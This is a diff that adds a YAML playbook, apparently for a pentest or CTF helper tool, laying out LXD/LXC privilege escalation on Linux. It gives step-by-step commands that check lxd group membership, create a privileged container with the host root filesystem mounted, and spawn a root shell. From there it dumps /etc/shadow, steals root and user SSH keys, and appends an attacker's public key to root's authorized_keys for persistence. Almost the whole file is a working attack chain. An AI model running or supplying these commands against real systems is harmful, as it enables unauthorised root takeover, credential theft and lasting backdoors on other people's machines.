@@ -1,0 +1,185 @@
+name: Linux Privilege Escalation - LXD / LXC
+
+steps:
+
+# =========================================================
+# [1] ENUMERATION
+# =========================================================
+- title: Enumerate LXD Access
+  mode: enum
+  info: |
+    Check if current user can control LXD/LXC containers.
+    Membership in lxd/lxc group often leads directly to root.
+
+  entries:
+
+    - cmd: "id"
+      info: current groups
+      look_for:
+        - lxd
+        - lxc
+
+    - cmd: "groups"
+      info: group membership
+
+    - cmd: "getent group lxd"
+      info: enumerate lxd group members
+
+    - cmd: "getent group lxc"
+      info: enumerate lxc group members
+
+    - cmd: "which lxc"
+      info: verify lxc installed
+
+    - cmd: "lxc image list"
+      info: enumerate existing images
+      look_for:
+        - alpine
+        - ubuntu
+        - local templates
+
+    - cmd: "find / -name '*.tar.xz' -o -name '*.tar.gz' 2>/dev/null"
+      info: search for local container templates
+      look_for:
+        - ubuntu-template.tar.xz
+        - alpine.tar.gz
+
+  notes:
+    - lxd group is commonly equivalent to root
+    - existing images/templates are common in HTB/CTFs
+    - containers often provide direct host filesystem access
+
+# =========================================================
+# [2] IMPORT IMAGE
+# =========================================================
+- title: Import Container Image
+  mode: chain
+  info: |
+    Import a local container image/template into LXD.
+
+  entries:
+
+    - cmd: "lxc image import ubuntu-template.tar.xz --alias privesc"
+      info: import ubuntu template
+
+    - cmd: "lxc image import alpine.tar.gz alpine.tar.gz.root --alias privesc"
+      info: import alpine image
+
+    - cmd: "lxc image list"
+      info: verify imported image
+
+  notes:
+    - alpine images are extremely common in CTFs
+    - use existing local templates whenever possible
+
+# =========================================================
+# [3] CREATE PRIVILEGED CONTAINER
+# =========================================================
+- title: Create Privileged Container
+  mode: chain
+  info: |
+    Create container with security.privileged=true.
+    This disables isolation protections.
+
+  entries:
+
+    - cmd: "lxc init privesc r00t -c security.privileged=true"
+      info: initialize privileged container
+
+    - cmd: "lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true"
+      info: mount host filesystem inside container
+
+  look_for:
+    - "Device host-root added"
+    - no permission errors
+
+  notes:
+    - source=/ mounts host root filesystem
+    - /mnt/root inside container becomes host filesystem
+
+# =========================================================
+# [4] START CONTAINER
+# =========================================================
+- title: Start Container
+  mode: chain
+  info: |
+    Start container and obtain root shell.
+
+  entries:
+
+    - cmd: "lxc start r00t"
+      info: start container
+
+    - cmd: "lxc exec r00t -- /bin/bash"
+      info: spawn bash shell
+
+    - cmd: "lxc exec r00t -- /bin/sh"
+      info: fallback shell (Alpine often lacks bash)
+
+    - cmd: "id"
+      info: verify root inside container
+
+  notes:
+    - newer lxd versions require '--'
+    - alpine commonly only has /bin/sh
+
+# =========================================================
+# [5] ACCESS HOST FILESYSTEM
+# =========================================================
+- title: Access Host Filesystem
+  mode: enum
+  info: |
+    Host filesystem is mounted at /mnt/root.
+
+  entries:
+
+    - cmd: "ls -la /mnt/root"
+      info: verify host mount
+
+    - cmd: "cd /mnt/root/root"
+      info: access host root home
+
+    - cmd: "cat /mnt/root/etc/shadow"
+      info: dump shadow file
+
+    - cmd: "cat /mnt/root/root/.ssh/id_rsa"
+      info: steal root ssh key
+
+    - cmd: "cat /mnt/root/etc/passwd"
+      info: enumerate users
+
+    - cmd: "find /mnt/root/home -name id_rsa 2>/dev/null"
+      info: search user ssh keys
+
+  look_for:
+    - password hashes
+    - ssh keys
+    - sensitive configs
+    - root access
+
+  notes:
+    - full host filesystem access usually means instant root compromise
+    - ssh keys are often easiest persistence method
+
+# =========================================================
+# [6] PERSISTENCE
+# =========================================================
+- title: Add Root SSH Key
+  mode: chain
+  info: |
+    Add attacker SSH key for persistent root access.
+
+  entries:
+
+    - cmd: "mkdir -p /mnt/root/root/.ssh"
+      info: ensure ssh directory exists
+
+    - cmd: "echo 'ATTACKER_PUBLIC_KEY' >> /mnt/root/root/.ssh/authorized_keys"
+      info: add attacker key
+
+    - cmd: "chmod 600 /mnt/root/root/.ssh/authorized_keys"
+      info: fix permissions
+
+  notes:
+    - replace ATTACKER_PUBLIC_KEY with your real key
+    - cleaner than password modification
